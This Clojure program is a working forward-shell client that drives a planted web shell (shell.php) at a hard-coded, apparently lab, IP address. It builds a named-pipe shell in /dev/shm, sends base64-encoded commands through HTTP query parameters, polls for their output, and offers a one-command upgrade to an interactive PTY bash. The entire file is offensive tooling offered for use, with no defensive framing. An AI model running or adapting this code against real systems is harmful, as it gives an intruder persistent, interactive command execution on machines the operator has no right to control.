(ns core
  (:require
    [clojure.string :as str]
    [clojure.java.io :as io]
    [clj-http.client :as client]
    [taoensso.timbre :as timbre]
    [clojure.tools.cli :refer [parse-opts]]) 
  (:import
    [java.util Base64])
  (:gen-class))

(timbre/set-min-level! :error)

(def status (atom {:running true}))
(def url "http://10.10.11.142/shell.php")

(defn send-command [cmd]
  (let [;_ (println "sending command" cmd)
        
        response (client/get url {:query-params {"e" cmd}
                                  ;:proxy-host "127.0.0.1" :proxy-port 8080
                                  ;:socket-timeout 3000 
                                  ;:connection-timeout 3000 
                                  :throw-exceptions false})]
    (:body response)))


(defn get-output []
  (while (:running @status)
    (let [result (send-command "cat /dev/shm/output.0")]
      (when (< 0 (count result))
        (println result)
        (print ">")
        (flush)
        (send-command "echo -n '' > /dev/shm/output.0"))
      (Thread/sleep 2000))))

(def thread-output
  (Thread. get-output))

(defn set-up []
  (send-command "mkfifo /dev/shm/input.0;tail -f /dev/shm/input.0|/usr/bin/sh 2>&1 > /dev/shm/output.0"))

(def thread-setup
  (Thread. set-up))

(defn send-cmd64 [cmd]
  (let [encoder (Base64/getEncoder)

        cmd64 (.encodeToString encoder (.getBytes (str cmd "\n")))
        
        full-cmd (str "echo " cmd64 "|base64 -d > /dev/shm/input.0")]
    (send-command full-cmd)))

(defn -main [& args] 
  (.start thread-setup)
  (Thread/sleep 1000)
  (.start thread-output)
  (Thread/sleep 1000)
  (print ">")
  (flush)
  (loop []
    (let [cmd 
          (read-line)]

      (case cmd 

        "quit"
        (do (System/exit 0))

        "upgrade"
        (do (send-cmd64 "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || script -qc /bin/bash /dev/null")
            (recur))

        (do (send-cmd64 cmd)
            (recur))))))
